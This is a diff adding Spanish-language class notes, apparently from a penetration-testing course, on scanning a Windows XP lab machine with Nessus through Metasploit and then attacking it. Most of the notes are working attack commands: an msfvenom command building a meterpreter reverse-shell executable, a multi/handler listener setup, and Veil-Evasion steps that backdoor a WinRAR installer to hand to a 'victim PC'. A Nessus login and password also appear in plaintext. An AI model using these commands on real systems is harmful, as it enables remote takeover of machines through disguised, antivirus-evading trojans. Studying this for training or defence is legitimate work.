@@ -1,0 +1,105 @@
+Fecha: 26 de febrero
+
+Orden:
+- Explicar nessus
+- Usar nessus en Metasploit
+- Análisis con nessus a windows xp
+- Exploit windows xp 
+- msfvenom
+- veilEvasion
+
+1)
+Nessus:
+    ip=172.16.10.?
+
+    ruta=>https://ip:8834/#/
+Loggueo:
+
+    user=>alestorm980
+    pwd=sistemaslomejor
+
+Comandos:
+    load nessus
+
+    help nessus
+
+Conectarse a nessus:
+    nessus_connect alestorm980:sistemaslomejor@ip
+
+Tipos de analisis:
+
+    nessus_policy_list
+
+Nuevo scanner:
+
+    nessus_scan_new 
+
+Comenzar
+
+    nessus_scan_launch
+
+2) Usar el exploit del analisis con nessus para atacar el windows xp remotamente
+
+3) Msfvenom:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+Recibir shell (metasploit):
+
+    use exploit/multi/handler
+
+    set payload windows/meterpreter/reverse_tcp
+
+    set lhost <ipPropia>
+
+    set lport (mismo puerto del msfvenom)
+
+    run
+Comandos utiles:
+    -sessions
+    -jobs
+
+
+
+4) Exploit con veilEvasion:
+    
+    -Descargar winrar
+        winrar: https://www.winrar.es/descargas/winrar
+    
+    -Ejecutar Veil-Evasion:
+    
+        ./Veil-Evasion.py
+    
+        list
+
+        native/backdoor_factory
+
+        set lhost <ipPropia>
+
+        set lport <puertoLibre ej:1234>
+
+        set ORIGINAL_EXE <ruta exe>
+
+        generate
+
+        copiar la ruta de salida del exe
+
+
+    - Pasar el archivo a la pc victima
+
+    - Recibir el shell (metasploit)
+
+        use exploit/multi/handler
+
+        set payload windows/meterpreter/reverse_tcp
+
+        set lhost <ipPropia>
+
+        set lport (mismo puerto del msfvenom)
+
+        run
+
+
+
+
+
